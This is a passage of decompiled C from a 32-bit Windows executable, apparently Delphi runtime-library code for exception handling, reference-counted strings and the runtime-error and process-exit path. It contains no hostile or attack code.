    // 0x402b20
    if (*(int32_t *)(a1 + 12) != 0) {
        // 0x402b2b
        function_402b42();
    }
    // 0x402b39
    return function_402dbe((int32_t)&g118);
}

// Address range: 0x402b42 - 0x402b48
int32_t function_402b42(void) {
    // 0x402b42
    int32_t result; // 0x402b42
    return result;
}

// Address range: 0x402b4a - 0x402b58
int32_t function_402b4a(void) {
    // 0x402b4a
    int32_t result; // 0x402b4a
    return result;
}

// Address range: 0x402b5a - 0x402b69
int32_t function_402b5a(void) {
    // 0x402b5a
    int32_t result; // 0x402b5a
    return result;
}

// Address range: 0x402b6a - 0x402b85
int32_t function_402b6a(void) {
    // 0x402b6a
    int32_t result; // 0x402b6a
    return result;
}

// Address range: 0x402b86 - 0x402ba7
int32_t function_402b86(void) {
    // 0x402b86
    int32_t v1; // 0x402b86
    return g15 == 0 ? v1 : 2;
}

// Address range: 0x402baa - 0x402bbf
int32_t function_402baa(int32_t a1, int32_t a2) {
    // 0x402baa
    return 0;
}

// Address range: 0x402bc2 - 0x402bd3
int32_t function_402bc2(int32_t a1) {
    // 0x402bc2
    int32_t result; // 0x402bc2
    if ((unsigned char)g15 < 2) {
        // 0x402bd2
        return result;
    }
    // 0x402bcb
    int32_t v1; // 0x402bc2
    return function_402baa(result, v1);
}

// Address range: 0x402bd6 - 0x402bf4
int32_t function_402bd6(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402bd6
    int32_t result; // 0x402bd6
    int32_t v1; // 0x402bd6
    if (v1 == 0) {
        // 0x402bf3
        return result;
    }
    char v2 = v1;
    int32_t v3 = *(int32_t *)(v1 + 1); // 0x402bda
    result = v3;
    if (v2 != -23 && v2 == -21) {
        // 0x402be7
        result = 0x1000000 * v3 / 0x1000000;
    }
    // 0x402bf3
    return result;
}

// Address range: 0x402bf6 - 0x402c1d
int32_t function_402bf6(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402bf6
    int32_t result; // 0x402bf6
    if ((unsigned char)g15 >= 2) {
        // 0x402bff
        int32_t v1; // 0x402bf6
        int32_t v2; // 0x402bf6
        int32_t v3; // 0x402bf6
        function_402bd6(v3, v1, v2);
        int32_t v4; // bp-16, 0x402bf6
        result = &v4;
    }
    // 0x402c1c
    return result;
}

// Address range: 0x402c1e - 0x402c3a
int32_t function_402c1e(void) {
    // 0x402c1e
    int32_t result; // 0x402c1e
    return result;
}

// Address range: 0x402c3a - 0x402c58
int32_t function_402c3a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402c3a
    int32_t v1; // bp-8, 0x402c3a
    int32_t * v2 = &v1; // 0x402c43
    if ((unsigned char)g15 >= 2) {
        int32_t v3 = 0xeedfae3; // bp-24, 0x402c4a
        v2 = &v3;
    }
    // 0x402c55
    return *(int32_t *)((int32_t)v2 + 4);
}

// Address range: 0x402c5a - 0x402d84
int32_t function_402c5a(int32_t a1, int32_t ExceptionInfo2, int32_t a3) {
    // 0x402c5a
    if ((*(int32_t *)(ExceptionInfo2 + 4) & 6) != 0) {
        // 0x402d7e
        return 1;
    }
    int32_t v1 = *(int32_t *)ExceptionInfo2; // 0x402c6b
    int32_t v2 = *(int32_t *)(ExceptionInfo2 + 24); // 0x402c77
    int32_t v3; // 0x402c5a
    if (v1 == 0xeedfade) {
        goto lab_0x402ce7;
    } else {
        // 0x402c79
        if (ExceptionInfo2 == 0 || g41 == 0) {
            // 0x402d7e
            return 1;
        }
        // 0x402c97
        v2 = ExceptionInfo2;
        if (v1 == 0xeefface) {
            goto lab_0x402ce7;
        } else {
            int32_t ExceptionInfo = function_402b86(); // 0x402ca7
            v2 = ExceptionInfo;
            if (g16 != 0 == g15 == 0) {
                // 0x402cbe
                v3 = a3;
                if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo) == 0) {
                    // 0x402d7e
                    return 1;
                }
                goto lab_0x402d0e;
            } else {
                goto lab_0x402ce7;
            }
        }
    }
  lab_0x402ce7:
    // 0x402ce7
    v3 = ExceptionInfo2;
    if (g16 > 1 == g15 == 0) {
        // 0x402cf9
        v3 = v2;
        if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo2) == 0) {
            // 0x402d7e
            return 1;
        }
    }
    goto lab_0x402d0e;
  lab_0x402d0e:;
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x402d0e
    *v4 = *v4 | 2;
    __readfsdword(0);
    int32_t * v5 = (int32_t *)function_404272(); // 0x402d3b
    int32_t v6 = *v5; // bp-56, 0x402d3b
    *v5 = (int32_t)&v6;
    int32_t v7; // 0x402c5a
    *(int32_t *)(v7 + 4) = 0x402d5e;
    return function_402bc2(v6);
}

// Address range: 0x402d86 - 0x402dbc
int32_t function_402d86(int32_t a1, int32_t a2) {
    // 0x402d86
    if ((*(int32_t *)(a2 + 4) & 6) != 0) {
        // 0x402d97
        *(int32_t *)(a1 + 4) = 0x402db6;
        int32_t v1; // 0x402d86
        int32_t v2; // 0x402d86
        int32_t v3; // 0x402d86
        int32_t v4; // 0x402d86
        function_402bf6(v4, v2, v1, v3);
    }
    // 0x402db6
    return 1;
}

// Address range: 0x402dbe - 0x402e0f
int32_t function_402dbe(int32_t a1) {
    // 0x402dbe
    *(int32_t *)(a1 + 4) = 0x402e09;
    int32_t * v1 = (int32_t *)function_404272(); // 0x402dce
    int32_t v2 = *v1; // 0x402dce
    *v1 = *(int32_t *)v2;
    int32_t v3 = *(int32_t *)(v2 + 12); // 0x402ddc
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x402ddf
    *v4 = *v4 & -3;
    if (*(int32_t *)v3 != 0xeedfade) {
        // 0x402deb
        function_402b6a();
    }
    // 0x402df8
    int32_t v5; // 0x402dbe
    *(int32_t *)v5 = *(int32_t *)__readfsdword(0);
    return 1;
}

// Address range: 0x402e12 - 0x402e41
int32_t function_402e12(int32_t a1) {
    int32_t * v1 = (int32_t *)function_404272(); // 0x402e17
    *v1 = *(int32_t *)*v1;
    __writefsdword(0, *(int32_t *)a1);
    return function_402c1e();
}

// Address range: 0x402e41 - 0x402e42
int32_t function_402e41(void) {
    // 0x402e41
    int32_t result; // 0x402e41
    return result;
}

// Address range: 0x402e42 - 0x402e57
int32_t function_402e42(int32_t a1, int32_t result) {
    // 0x402e42
    __writefsdword(0, result);
    return result;
}

// Address range: 0x402e57 - 0x402e58
int32_t function_402e57(void) {
    // 0x402e57
    int32_t result; // 0x402e57
    return result;
}

// Address range: 0x402e5a - 0x402ef6
int32_t function_402e5a(int32_t a1) {
    // 0x402e5a
    function_40254a();
    // UNREACHABLE
}

// Address range: 0x402ef6 - 0x402efa
int32_t function_402ef6(int32_t a1) {
    // 0x402ef6
    int32_t result; // 0x402ef6
    return result;
}

// Address range: 0x402efa - 0x402f97
int32_t function_402efa(int32_t a1, int32_t a2) {
    int32_t ExceptionInfo = a1;
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        // 0x402f94
        return 0;
    }
    // 0x402f0b
    if (g15 == 0) {
        // 0x402f14
        if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo) == 0) {
            // 0x402f94
            return 0;
        }
    }
    // 0x402f23
    if (g41 == 0) {
        function_402e5a((int32_t)&g118);
        // UNREACHABLE
    }
    // 0x402f6f
    function_402c3a(0, a2, ExceptionInfo);
    function_403366((int32_t)&g41);
    // UNREACHABLE
}

// Address range: 0x402f9a - 0x402fb7
int32_t function_402f9a(void) {
    // 0x402f9a
    int32_t v1; // 0x402f9a
    int32_t result = v1 - 12; // 0x402f9c
    int32_t v2 = __readfsdword(0); // 0x402f9f
    __writefsdword(0, result);
    *(int32_t *)result = v2;
    *(int32_t *)(v1 - 8) = 0x402efa;
    g76 = result;
    return result;
}

// Address range: 0x402fba - 0x402fe2
int32_t function_402fba(void) {
    // 0x402fba
    if (g76 == 0) {
        // 0x402fe1
        return 0;
    }
    int32_t v1 = __readfsdword(0); // 0x402fc5
    int32_t v2 = v1; // 0x402fca
    if (g76 == v1) {
        int32_t result = *(int32_t *)g76; // 0x402fcc
        __writefsdword(0, result);
        return result;
    }
    int32_t result2 = g76; // 0x402fd7
    while (v2 != -1) {
        int32_t * v3 = (int32_t *)v2;
        v2 = *v3;
        if (v2 == g76) {
            // 0x402fdd
            result2 = *(int32_t *)g76;
            *v3 = result2;
            return result2;
        }
        result2 = g76;
    }
  lab_0x402fe1:
    // 0x402fe1
    return result2;
}

// Address range: 0x402fe2 - 0x403041
int32_t function_402fe2(void) {
    // 0x402fe2
    if (g77 == 0) {
        // 0x40303c
        return 0;
    }
    int32_t v1 = __readfsdword(0); // bp-28, 0x403002
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g78; // 0x40300a
    if (g78 < 1) {
        // 0x40301e
        __writefsdword(0, v1);
        // 0x40303c
        return 0;
    }
    v2--;
    while (v2 >= 0 == (v2 != 0)) {
        // 0x40300c
        v2--;
    }
    // 0x40301e
    g78 = v2;
    // 0x40301e
    __writefsdword(0, v1);
    // 0x40303c
    return 0;
}

// Address range: 0x403042 - 0x4030a1
int32_t function_403042(int32_t a1) {
    // 0x403042
    if (g77 == 0) {
        // 0x40309c
        return 0;
    }
    uint32_t v1 = *(int32_t *)g77; // 0x403051
    int32_t v2 = __readfsdword(0); // bp-28, 0x403060
    __writefsdword(0, (int32_t)&v2);
    if (v1 >= 1) {
        // 0x40306a
        g78 = v1;
    }
    // 0x40307e
    __writefsdword(0, v2);
    // 0x40309c
    return 0;
}

// Address range: 0x4030a2 - 0x403169
int32_t function_4030a2(int32_t a1) {
    // 0x4030a2
    int32_t v1; // 0x4030a2
    char * v2 = (char *)(v1 - 60); // 0x4030b2
    __asm_rep_movsd_memcpy(v2, (char *)&g75, 11);
    g75 = v2;
    int32_t * v3 = (int32_t *)(v1 + 12); // 0x4030e2
    int32_t v4; // 0x4030a2
    g78 = *v3 != 0 ? 0 : v4;
    g42 = 0x40106a;
    g43 = 0x401072;
    function_402f9a();
    g80 = (char)*v3 + 1;
    if (g44 == 0) {
        // 0x40314a
        *(char *)&g46 = 1;
    }
    // 0x403157
    if (*v3 == 1) {
        // 0x403161
        int32_t v5; // 0x4030a2
        return function_403042(v5);
    }
    function_403282();
    // UNREACHABLE
}

// Address range: 0x403169 - 0x40316a
int32_t function_403169(void) {
    // 0x403169
    int32_t result; // 0x403169
    return result;
}

// Address range: 0x40316a - 0x4031c4
int32_t function_40316a(void) {
    int32_t v1 = 16; // 0x403174
    int32_t v2 = g8;
    int64_t v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2; // 0x403182
    *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
    int32_t v4 = v3 / 10; // 0x403196
    v1--;
    while (v4 != 0) {
        // 0x40317a
        v2 = v4;
        v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2;
        *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
        v4 = v3 / 10;
        v1--;
    }
    int32_t v5 = 28; // 0x4031a1
    uint32_t v6 = g9;
    char v7 = *(char *)((v6 & 15) + (int32_t)&g20); // 0x4031ab
    *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
    int32_t result = v6 / 16; // 0x4031b8
    v5--;
    while (v6 >= 16) {
        // 0x4031a6
        v6 = result;
        v7 = *(char *)((v6 & 15) + (int32_t)&g20);
        *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
        result = v6 / 16;
        v5--;
    }
    // 0x4031c0
    return result;
}

// Address range: 0x4031c6 - 0x4031f3
int32_t function_4031c6(void) {
    int32_t v1 = g8; // 0x4031c8
    g8 = 0;
    __asm_rep_movsd_memcpy((char *)&g75, g75, 11);
    return v1 == 0;
}

// Address range: 0x4031f3 - 0x4031f4
int32_t function_4031f3(void) {
    // 0x4031f3
    int32_t result; // 0x4031f3
    return result;
}

// Address range: 0x4031f6 - 0x403275
int32_t function_4031f6(void) {
    // 0x4031f6
    int32_t hWnd; // 0x4031f6
    if (g50 == 0) {
        // 0x403257
        int32_t result; // 0x4031f6
        if (g17 == 0) {
            // 0x403260
            result = MessageBoxA((int32_t *)hWnd, NULL, "Error", (int32_t)"Runtime error     at 00000000");
        }
        // 0x403273
        return result;
    }
    // 0x403200
    int32_t v1; // bp-4, 0x4031f6
    int32_t hFile = function_401062(hWnd, 0, &v1, 30, "Runtime error     at 00000000"); // 0x40322f
    int32_t v2 = hFile; // bp-28, 0x403234
    WriteFile((int32_t *)hFile, &g118, (int32_t)&g118, &g118, (struct _OVERLAPPED *)&g118);
    int32_t hFile2 = function_401062(0, (int32_t)&v2, (int32_t *)2, (int32_t)"\r\n", (char *)-11); // 0x40324a
    bool result2 = WriteFile((int32_t *)hFile2, &g118, (int32_t)&g118, &g118, (struct _OVERLAPPED *)&g118); // 0x403250
    return result2;
}

// Address range: 0x403282 - 0x403355
int32_t function_403282(void) {
    // 0x403282
    if (g80 == 0 && g49 != 0) {
        // 0x4032a0
        g49 = 0;
    }
    // 0x4032b1
    if (g9 != 0) {
        // 0x4032ba
        function_40316a();
        function_4031f6();
        g9 = 0;
    }
    // 0x4032cb
    int32_t v1; // bp-16, 0x403282
    int32_t v2 = &v1;
    int32_t v3 = &g8; // 0x40334f
    int32_t v4; // 0x403282
    int32_t v5; // 0x403282
    int32_t v6; // 0x403282
    while (true) {
      lab_0x4032cb:
        // 0x4032cb
        v4 = v3;
        v5 = v2;
        if (g80 == 2) {
            // 0x4032d1
            if (*(int32_t *)v4 == 0) {
                // 0x4032d6
                g78 = 0;
            }
        }
        // 0x4032db
        function_402fe2();
        if (g80 < 2) {
            goto lab_0x4032eb;
        } else {
            // 0x4032e6
            v6 = v5;
            if (*(int32_t *)v4 == 0) {
                goto lab_0x40330c;
            } else {
                goto lab_0x4032eb;
            }
        }
    }
  lab_0x40332a:
    // 0x40332a
    *(int32_t *)(v2 - 4) = *(int32_t *)v4;
    ExitProcess((int32_t)&g118);
    // UNREACHABLE
  lab_0x4032eb:
    // 0x4032eb
    v6 = v5;
    if (g79 != 0) {
        // 0x4032f2
        function_403f22();
        int32_t v7 = *(int32_t *)(g79 + 16); // 0x4032fa
        v6 = v5;
        if (!((v7 == 0 | v7 == *(int32_t *)(g79 + 4)))) {
            int32_t v8 = v5 - 4; // 0x403306
            *(int32_t *)v8 = v7;
            FreeLibrary(&g118);
            v6 = v8;
        }
    }
    goto lab_0x40330c;
  lab_0x40330c:
    // 0x40330c
    v2 = v6;
    function_402fba();
    if (g80 != 0) {
        // 0x403320
        function_4031c6();
    }
    // 0x403325
    if (g75 == NULL) {
        // break -> 0x40332a
        goto lab_0x40332a;
    }
    int32_t * v9 = (int32_t *)(v2 - 4); // 0x403343
    *v9 = v4;
    __asm_rep_movsd_memcpy((char *)&g75, g75, 11);
    v3 = *v9;
    goto lab_0x4032cb;
}

// Address range: 0x403355 - 0x40335a
int32_t function_403355(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x403355
    int32_t result; // 0x403355
    return result;
}

// Address range: 0x40335a - 0x403364
int32_t function_40335a(void) {
    // 0x40335a
    function_403282();
    // UNREACHABLE
}

// Address range: 0x403364 - 0x403365
int32_t function_403364(void) {
    // 0x403364
    int32_t result; // 0x403364
    return result;
}

// Address range: 0x403366 - 0x403371
int32_t function_403366(int32_t a1) {
    // 0x403366
    g9 = a1;
    return function_40335a();
}

// Address range: 0x403371 - 0x403372
int32_t function_403371(void) {
    // 0x403371
    int32_t result; // 0x403371
    return result;
}

// Address range: 0x403372 - 0x403395
int32_t function_403372(void) {
    // 0x403372
    int32_t result; // 0x403372
    if (result == 0) {
        // 0x403394
        return result;
    }
    // 0x403378
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x40337e
    int32_t v2 = *v1; // 0x40337e
    if (v2 < 1) {
        // 0x403394
        return result;
    }
    int32_t v3 = v2 - 1; // 0x403384
    *v1 = v3;
    if (v3 == 0) {
        // 0x40338a
        function_4024da();
    }
    // 0x403394
    return result;
}

// Address range: 0x403396 - 0x4033c5
int32_t function_403396(void) {
    int32_t v1; // 0x403396
    int32_t * v2 = (int32_t *)v1; // 0x40339c
    int32_t v3 = *v2; // 0x40339c
    int32_t v4; // 0x403396
    int32_t v5 = v4; // 0x4033a0
    int32_t * v6; // 0x4033a8
    uint32_t v7; // 0x4033a8
    int32_t v8; // 0x4033ae
    if (v3 != 0) {
        // 0x4033a2
        *v2 = 0;
        v6 = (int32_t *)(v3 - 8);
        v7 = *v6;
        v5 = v4;
        if (v7 >= 1) {
            // 0x4033ae
            v8 = v7 - 1;
            *v6 = v8;
            v5 = v4;
            if (v8 == 0) {
                // 0x4033b4
                v5 = function_4024da();
            }
        }
    }
    int32_t result = v5;
    int32_t v9; // 0x403396
    int32_t v10 = v9 - 1; // 0x4033bf
    v1 += 4;
    while (v10 != 0) {
        int32_t v11 = result;
        v2 = (int32_t *)v1;
        v3 = *v2;
        v5 = v11;
        if (v3 != 0) {
            // 0x4033a2
            *v2 = 0;
            v6 = (int32_t *)(v3 - 8);
            v7 = *v6;
            v5 = v11;
            if (v7 >= 1) {
                // 0x4033ae
                v8 = v7 - 1;
                *v6 = v8;
                v5 = v11;
                if (v8 == 0) {
                    // 0x4033b4
                    v5 = function_4024da();
                }
            }
        }
        // 0x4033bc
        result = v5;
        v10--;
        v1 += 4;
    }
    // 0x4033c2
    return result;
}

// Address range: 0x4033c6 - 0x403409
int32_t function_4033c6(void) {
    int32_t v1 = 0; // 0x4033c8
    int32_t v2; // 0x4033c6
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)(v2 - 8); // 0x4033ca
        int32_t v4 = *v3; // 0x4033ca
        int32_t v5 = v4 + 1; // 0x4033cd
        if (v5 < 0 == (v5 & (v4 ^ -0x80000000)) < 0 == (v5 != 0)) {
            // 0x4033ea
            *v3 = v5;
        } else {
            // 0x4033d0
            v1 = function_40340a();
            function_4025be();
        }
    }
    // 0x4033ee
    int32_t v6; // 0x4033c6
    *(int32_t *)v6 = v1;
    int32_t result = 0; // 0x4033f2
    if (v6 == 0) {
        // 0x403408
        return result;
    }
    int32_t * v7 = (int32_t *)(v6 - 8); // 0x4033f4
    int32_t v8 = *v7; // 0x4033f4
    if (v8 < 1) {
        // 0x403408
        return result;
    }
    int32_t v9 = v8 - 1; // 0x4033fa
    *v7 = v9;
    if (v9 == 0) {
        // 0x403400
        result = function_4024da();
    }
    // 0x403408
    return result;
}

// Address range: 0x40340a - 0x403435
int32_t function_40340a(void) {
    // 0x40340a
    int32_t v1; // 0x40340a
    if (v1 < 1) {
        // 0x403432
        return 0;
    }
    int32_t v2 = function_4024ba(); // 0x403416
    *(int16_t *)(v2 + (v1 + 8 & -2)) = 0;
    *(int32_t *)v2 = 1;
    return v2 + 8;
}

// Address range: 0x403436 - 0x403464
int32_t function_403436(void) {
    int32_t v1 = function_40340a(); // 0x403441
    int32_t v2; // 0x403436
    if (v2 != 0) {
        // 0x40344e
        function_4025be();
    }
    int32_t result = function_403372(); // 0x403459
    int32_t v3; // 0x403436
    *(int32_t *)v3 = v1;
    return result;
}

// Address range: 0x403466 - 0x403475
int32_t function_403466(void) {
    // 0x403466
    return function_403436();
}

// Address range: 0x403476 - 0x4034a2
int32_t function_403476(void) {
    // 0x403476
    int32_t v1; // 0x403476
    if (v1 == 0 || *(char *)v1 == 0) {
        // 0x40349d
        return function_403436();
    }
    int32_t v2; // 0x403476
    while (*(char *)(v2 + 1) != 0) {
        // 0x403486
        if (*(char *)(v2 + 2) == 0) {
            // break -> 0x40349d
            break;
        }
        // 0x40348b
        if (*(char *)(v2 + 3) == 0) {
            // break -> 0x40349d
            break;
        }
        int32_t v3 = v2 + 4; // 0x403490
        v2 = v3;
        if (*(char *)v3 == 0) {
            // break -> 0x40349d
            break;
        }
    }
    // 0x40349d
    return function_403436();
}

// Address range: 0x4034a2 - 0x4034a3
int32_t function_4034a2(void) {
    // 0x4034a2
    int32_t result; // 0x4034a2
    return result;
}

// Address range: 0x4034a6 - 0x4034b0
int32_t function_4034a6(void) {
    // 0x4034a6
    return function_403436();
}

// Address range: 0x4034b0 - 0x4034b1
int32_t function_4034b0(void) {
    // 0x4034b0
    int32_t result; // 0x4034b0
    return result;
}

// Address range: 0x4034b2 - 0x4034c9
int32_t function_4034b2(void) {
    // 0x4034b2
    return function_403436();
}

// Address range: 0x4034c9 - 0x4034ca
int32_t function_4034c9(void) {
    // 0x4034c9
    int32_t result; // 0x4034c9
    return result;
}

// Address range: 0x4034ca - 0x4034d2
int32_t function_4034ca(void) {
    int32_t result = 0; // 0x4034cc
    int32_t v1; // 0x4034ca
    if (v1 != 0) {
        // 0x4034ce
        result = *(int32_t *)(v1 - 4);
    }
    // 0x4034d1
    return result;
}

// Address range: 0x4034d2 - 0x403516
int32_t function_4034d2(void) {
    // 0x4034d2
    int32_t v1; // 0x4034d2
    int32_t result; // 0x4034d2
    if (v1 == 0) {
        // 0x403515
        return result;
    }
    if (result == 0) {
        function_4033c6();
    }
    // 0x4034e0
    function_403856();
    return function_4025be();
}

// Address range: 0x403516 - 0x403589
int32_t function_403516(void) {
    // 0x403516
    int32_t v1; // 0x403516
    if (v1 == 0) {
        // 0x40357b
        return function_4033c6();
    }
    int32_t v2; // 0x403516
    int32_t v3; // 0x403516
    if (v3 == 0) {
        v2 = function_4033c6();
    }
    // 0x403522
    if (v1 == v2) {
        // 0x403582
        return function_4034d2();
    }
    if (v3 != v2) {
        // 0x40352a
        function_4033c6();
        return function_4034d2();
    }
    int32_t v4 = function_40340a(); // 0x403546
    function_4025be();
    function_4025be();
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)(v4 - 8); // 0x40356f
        *v5 = *v5 - 1;
    }
    // 0x403572
    return function_4033c6();
}

// Address range: 0x403589 - 0x40358a
int32_t function_403589(void) {
    // 0x403589
    int32_t result; // 0x403589
    return result;
}

// Address range: 0x40358a - 0x403613
int32_t function_40358a(int32_t result) {
    // 0x40358a
    int32_t v1; // bp-20, 0x40358a
    int32_t v2 = (int32_t)&v1 + 20; // 0x403593
    int32_t v3; // 0x40358a
    int32_t v4 = *(int32_t *)(v2 + 4 * v3); // 0x403593
    int32_t v5; // 0x40358a
    int32_t v6 = v3 + (int32_t)!((v4 == 0 | v5 != v4)); // 0x4035ba
    int32_t v7 = v4 == 0 | v5 != v4 ? 0 : v4;
    int32_t v8 = *(int32_t *)(4 * v6 + v2); // 0x4035a9
    int32_t v9 = v7; // 0x4035af
    if (v8 != 0) {
        // 0x4035b1
        v9 = v7 != v8 ? v7 : 0;
    }
    int32_t v10 = v9;
    v6--;
    while (v6 != 0) {
        // 0x4035a9
        v7 = v10;
        v8 = *(int32_t *)(4 * v6 + v2);
        v9 = v7;
        if (v8 != 0) {
            // 0x4035b1
            v9 = v7 != v8 ? v7 : 0;
        }
        // 0x4035ba
        v10 = v9;
        v6--;
    }
    int32_t v11; // 0x40358a
    int32_t v12; // 0x40358a
    int32_t v13; // bp-24, 0x40358a
    if (v10 == 0) {
        // 0x4035d8
        v13 = function_40340a();
        v12 = 0;
    } else {
        // 0x4035c1
        v13 = function_403856();
        v11 = v3 - 1;
        v12 = v1;
    }
    int32_t v14 = v11; // 0x4035f4
    if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
        // 0x4035ea
        function_4025be();
    }
    // 0x4035f4
    v14--;
    while (v14 != 0) {
        // 0x4035e0
        if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
            // 0x4035ea
            function_4025be();
        }
        // 0x4035f4
        v14--;
    }
    if (v12 != 0) {
        // 0x403609
        return result;
    }
    // 0x4035fd
    if (v13 != 0) {
        int32_t * v15 = (int32_t *)(v13 - 8); // 0x403601
        *v15 = *v15 - 1;
    }
    // 0x403604
    function_4033c6();
    // 0x403609
    return result;
}

// Address range: 0x403613 - 0x403614
int32_t function_403613(void) {
    // 0x403613
    int32_t result; // 0x403613
    return result;
}

// Address range: 0x403616 - 0x4036b8
int32_t function_403616(void) {
    // 0x403616
    int32_t v1; // 0x403616
    int32_t v2; // 0x403616
    if (v2 == v1) {
        // 0x40369f
        int32_t result; // 0x403616
        return result;
    }
    if (v2 == 0) {
        // 0x40369f
        return -*(int32_t *)(v1 - 4);
    }
    uint32_t result2 = *(int32_t *)(v2 - 4);
    if (v1 == 0) {
        // 0x40369f
        return result2;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x403630
    int32_t result3 = result2 - v3; // 0x403633
    uint32_t v4 = result2 < v3 | result3 == 0 ? result2 : v3;
    int32_t v5 = v4 / 4; // 0x40363d
    int32_t v6; // 0x403616
    int32_t v7; // 0x403616
    if (v4 < 4) {
        goto lab_0x403665;
      lab_0x403665:;
        int32_t v8 = v4 & 3; // 0x403666
        if (v8 == 0) {
            // 0x40369f
            return 2 * result3;
        }
        uint32_t v9 = *(int32_t *)v7; // 0x40366b
        uint32_t v10 = *(int32_t *)v6; // 0x40366d
        if ((char)v9 != (char)v10) {
            // 0x40369f
            return result3;
        }
        int32_t v11 = v8 - 1; // 0x403673
        if (v11 == 0) {
            // 0x40369f
            return 2 * result3;
        }
        // 0x403676
        if ((char)(v9 / 256) != (char)(v10 / 256)) {
            // 0x40369f
            return result3;
        }
        if (v11 == 1) {
            // 0x40369f
            return 2 * result3;
        }
        // 0x40367d
        if (((v10 ^ v9) & 0xff0000) != 0) {
            // 0x40369f
            return result3;
        }
        // 0x40369f
        return 2 * result3;
    }
    int32_t v12; // 0x403616
    int32_t v13 = v12;
    int32_t v14; // 0x403616
    while (*(int32_t *)v14 == *(int32_t *)v13) {
        int32_t v15 = v14 + 4;
        if (v5 == 1) {
            // 0x40365f
            v7 = v15;
            v6 = v13 + 4;
            goto lab_0x403665;
        }
        // 0x40364a
        if (*(int32_t *)v15 != *(int32_t *)(v13 + 4)) {
            // break -> 0x40369f
            break;
        }
        int32_t v16 = v14 + 8; // 0x403654
        int32_t v17 = v13 + 8; // 0x403657
        v5 -= 2;
        v14 = v16;
        v7 = v16;
        v6 = v17;
        if (v5 == 0) {
            goto lab_0x403665;
        }
        v13 = v17;
    }
    // 0x40369f
    return result3;
}

// Address range: 0x4036ba - 0x4036c9
int32_t function_4036ba(void) {
    // 0x4036ba
    int32_t result; // 0x4036ba
    if (result == 0) {
        // 0x4036c8
        return result;
    }
    int32_t * v1 = (int32_t *)(result - 8); // 0x4036be
    uint32_t v2 = *v1 + 1; // 0x4036c1
    if (v2 >= 1) {
        // 0x4036c4
        *v1 = v2;
    }
    // 0x4036c8
    return result;
}

// Address range: 0x4036ca - 0x4036d6
int32_t function_4036ca(void) {
    // 0x4036ca
    int32_t v1; // 0x4036ca
    return v1 == 0 ? 0x4036cf : v1;
}

// Address range: 0x4036d6 - 0x403717
int32_t function_4036d6(void) {
    // 0x4036d6
    int32_t v1; // 0x4036d6
    if (v1 == 0 || *(int32_t *)(v1 - 8) == 1) {
        // 0x403714
        return 0;
    }
    int32_t result = function_40340a(); // 0x4036e8
    *(int32_t *)v1 = result;
    function_4025be();
    int32_t * v2 = (int32_t *)(result - 8); // 0x4036fd
    int32_t v3 = *v2; // 0x4036fd
    if (v3 < 1) {
        // 0x403714
        return result;
    }
    int32_t v4 = v3 - 1; // 0x403703
    *v2 = v4;
    int32_t result2 = result; // 0x403707
    if (v4 == 0) {
        // 0x403709
        result2 = function_4024da();
    }
    // 0x403714
    return result2;
}

// Address range: 0x40371a - 0x40371f
int32_t function_40371a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40371a
    return function_4036d6();
}

// Address range: 0x40371f - 0x403720
int32_t function_40371f(void) {
    // 0x40371f
    int32_t result; // 0x40371f
    return result;
}

// Address range: 0x403722 - 0x403727
int32_t function_403722(void) {
    // 0x403722
    return function_4036d6();
}

// Address range: 0x403727 - 0x403728
int32_t function_403727(void) {
    // 0x403727
    int32_t result; // 0x403727
    return result;
}

// Address range: 0x40372a - 0x403769
int32_t function_40372a(int32_t * a1) {
    // 0x40372a
    int32_t v1; // 0x40372a
    if (v1 == 0) {
        // 0x403765
        return function_403372();
    }
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x40372f
    if (v2 == 0) {
        // 0x403765
        return function_403372();
    }
    int32_t v3; // 0x40372a
    int32_t v4; // 0x40372a
    if (v3 < 1) {
        if (v4 < 0) {
            // 0x403765
            return function_403372();
        }
        // 0x403765
        return function_403436();
    }
    if (v4 < 0 || v3 - 1 >= v2) {
        // 0x403765
        return function_403372();
    }
    // 0x403765
    return function_403436();
}

// Address range: 0x403769 - 0x40376a
int32_t function_403769(void) {
    // 0x403769
    int32_t result; // 0x403769
    return result;
}

// Address range: 0x40376a - 0x4037b2
int32_t function_40376a(void) {
    // 0x40376a
    int32_t v1; // 0x40376a
    int32_t v2; // 0x40376a
    int32_t v3; // 0x40376a
    int32_t result = function_40371a(v3, v2, v1); // 0x403773
    if (result == 0) {
        // 0x4037ae
        return 0;
    }
    // 0x40377e
    int32_t v4; // 0x40376a
    if (v4 < 1) {
        // 0x4037ae
        return result;
    }
    int32_t result2 = result; // 0x403786
    int32_t v5; // 0x40376a
    if (!((v5 < 1 | *(int32_t *)(result - 4) <= v4 - 1))) {
        // 0x40378c
        function_4025be();
        result2 = function_403856();
    }
    // 0x4037ae
    return result2;
}

// Address range: 0x4037b2 - 0x40380d
int32_t function_4037b2(void) {
    int32_t result = 0; // 0x4037b4
    int32_t v1; // 0x4037b2
    if (v1 != 0) {
        // 0x4037b6
        function_403856();
        function_4025be();
        result = function_4025be();
    }
    // 0x40380c
    return result;
}

// Address range: 0x40380e - 0x403853
int32_t function_40380e(void) {
    // 0x40380e
